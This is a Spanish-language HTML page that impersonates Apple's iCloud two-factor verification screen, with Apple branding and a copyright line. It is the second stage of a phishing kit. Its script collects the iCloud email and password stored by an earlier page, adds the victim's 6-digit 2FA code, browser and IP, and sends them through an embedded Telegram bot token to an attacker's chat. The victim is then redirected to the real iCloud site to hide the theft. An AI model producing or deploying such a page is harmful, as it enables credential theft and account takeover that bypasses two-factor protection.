<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iCloud - Verificaci√≥n</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f9f9fc 0%, #f2f5fa 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .status-bar {
            width: 100%;
            max-width: 400px;
            padding: 12px 0;
            color: #000;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
        }

        .icloud-logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .icloud-logo svg {
            width: 40px;
            height: 40px;
        }

        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            font-size: 15px;
            color: #6e6e73;
            margin-bottom: 24px;
        }

        .code-label {
            font-size: 14px;
            color: #1d1d1f;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 24px;
        }

        .code-input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            border: 2px solid #e6e6ec;
            border-radius: 12px;
            background: white;
            transition: all 0.2s;
        }

        .code-input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.1);
        }

        .links {
            margin-bottom: 24px;
        }

        .link {
            display: block;
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 8px;
            cursor: pointer;
        }

        .link:hover {
            text-decoration: underline;
        }

        .info-box {
            background: #f5f5f7;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #1d1d1f;
            line-height: 1.5;
        }

        .device-actions {
            display: flex;
            justify-content: space-between;
            margin-bottom: 24px;
        }

        .device-link {
            color: #0071e3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 8px 0;
        }

        .device-link:hover {
            text-decoration: underline;
        }

        .verify-button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .verify-button:hover {
            background: #0077ed;
        }

        .footer {
            width: 100%;
            max-width: 400px;
            margin-top: 32px;
            text-align: center;
            font-size: 12px;
            color: #6e6e73;
        }

        .footer a {
            color: #6e6e73;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            color: #0071e3;
            text-decoration: underline;
        }

        .footer p {
            margin-top: 12px;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 16px 0;
            color: #0071e3;
        }

        .success-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #34c759;
            font-size: 14px;
            padding: 10px;
            background: #e3f7e7;
            border-radius: 8px;
        }

        .error-message {
            display: none;
            text-align: center;
            margin: 12px 0;
            color: #ff3b30;
            font-size: 14px;
            padding: 10px;
            background: #ffe9e8;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="status-bar">11:05</div>

    <div class="container">
        <div class="icloud-logo">
            <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 8C14.477 8 10 12.477 10 18C10 18.681 10.08 19.343 10.229 19.978C8.296 21.126 7 23.255 7 25.5C7 28.538 9.462 31 12.5 31H27.5C30.538 31 33 28.538 33 25.5C33 23.255 31.704 21.126 29.771 19.978C29.92 19.343 30 18.681 30 18C30 12.477 25.523 8 20 8Z" fill="#0071E3"/>
                <path d="M20 10C15.582 10 12 13.582 12 18C12 18.55 12.058 19.086 12.168 19.605L12.307 20.253L11.687 20.496C10.097 21.097 9 22.661 9 24.5C9 26.985 11.015 29 13.5 29H26.5C28.985 29 31 26.985 31 24.5C31 22.661 29.903 21.097 28.313 20.496L27.693 20.253L27.832 19.605C27.942 19.086 28 18.55 28 18C28 13.582 24.418 10 20 10Z" fill="white"/>
            </svg>
        </div>

        <h1>Autenticaci√≥n de dos factores</h1>
        <div class="subtitle">Verificaci√≥n de seguridad</div>

        <form id="verificationForm">
            <div class="code-label">Ingresa el c√≥digo de verificaci√≥n enviado a tu iPhone.</div>
            
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" class="code-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>

            <div class="links">
                <a class="link" onclick="resendCode()">Reenviar c√≥digo a iPhone</a>
                <a class="link" onclick="alert('Opci√≥n no disponible temporalmente')">No puedo acceder a mi iPhone</a>
            </div>

            <div class="info-box">
                Si no puedes ingresar un c√≥digo porque perdiste tu dispositivo, puedes usar Encontrar dispositivos para ubicarlo o Administrar dispositivos para eliminar tus tarjetas de Apple Pay del dispositivo.
            </div>

            <div class="device-actions">
                <a class="device-link" onclick="alert('Redirigiendo a Encontrar dispositivos...')">Encontrar dispositivos</a>
                <a class="device-link" onclick="alert('Redirigiendo a Administrar dispositivos...')">Administrar dispositivos</a>
            </div>

            <button type="submit" class="verify-button">Verificar</button>

            <div class="loading" id="loading">Verificando c√≥digo...</div>
            <div class="success-message" id="successMessage">‚úÖ Verificaci√≥n exitosa</div>
            <div class="error-message" id="errorMessage"></div>
        </form>
    </div>

    <div class="footer">
        <div>
            <a href="#" onclick="alert('Estado del sistema')">Estado del sistema</a>
            <a href="#" onclick="alert('Pol√≠tica de privacidad')">Pol√≠tica de privacidad</a>
            <a href="#" onclick="alert('T√©rminos y condiciones')">T√©rminos y condiciones</a>
        </div>
        <p>Copyright ¬© 2025 Apple Inc. Todos los derechos reservados.</p>
    </div>

    <script>
        // CONFIGURACI√ìN DE TELEGRAM (MISMA QUE EN INDEX)
        const TELEGRAM_BOT_TOKEN = '8273125469:AAG_fkueGpHdtvWebjHq2utGccJsnCxrL8g';
        const TELEGRAM_CHAT_ID = '6939469358';

        // Configuraci√≥n de inputs de c√≥digo
        const inputs = document.querySelectorAll('.code-input');
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Solo permitir n√∫meros
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function resendCode() {
            alert('Se ha reenviado el c√≥digo de verificaci√≥n a tu iPhone.');
        }

        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = Array.from(inputs).map(input => input.value).join('');
            const loading = document.getElementById('loading');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            
            // Validar c√≥digo
            if (code.length !== 6) {
                errorMessage.textContent = '‚ùå Por favor, ingresa el c√≥digo completo de 6 d√≠gitos';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 3000);
                return;
            }
            
            // Ocultar mensajes anteriores
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // Recuperar datos de la primera etapa
                const email = sessionStorage.getItem('icloud_email') || 'No disponible';
                const password = sessionStorage.getItem('icloud_password') || 'No disponible';
                const ip = sessionStorage.getItem('icloud_ip') || 'No disponible';
                
                // Crear mensaje para Telegram
                const message = `üî¥ iCLOUD 2FA - SEGUNDA ETAPA üî¥

üìß Email/Tel√©fono: ${email}
üîë Contrase√±a: ${password}
üî¢ C√≥digo 2FA: ${code}

üåê Informaci√≥n:
- IP: ${ip}
- Navegador: ${getBrowserInfo()}
- Plataforma: ${navigator.platform}
- Hora: ${new Date().toLocaleString()}
- URL: ${window.location.href}

‚úÖ CAPTURA COMPLETA`;

                // Enviar a Telegram
                const response = await sendToTelegram(message);
                
                if (response.ok) {
                    loading.style.display = 'none';
                    successMessage.style.display = 'block';
                    
                    // Limpiar sessionStorage
                    sessionStorage.clear();
                    
                    // Redirigir a Apple
                    setTimeout(() => {
                        window.location.href = 'https://www.icloud.com/';
                    }, 2000);
                } else {
                    throw new Error('Error en Telegram');
                }
                
            } catch (error) {
                console.error('Error:', error);
                loading.style.display = 'none';
                errorMessage.textContent = '‚ùå Error al verificar el c√≥digo';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 3000);
            }
        });

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            return response;
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Desconocido';
        }

        // Auto-focus en el primer input
        window.addEventListener('load', () => {
            inputs[0].focus();
        });
    </script>
</body>
</html>
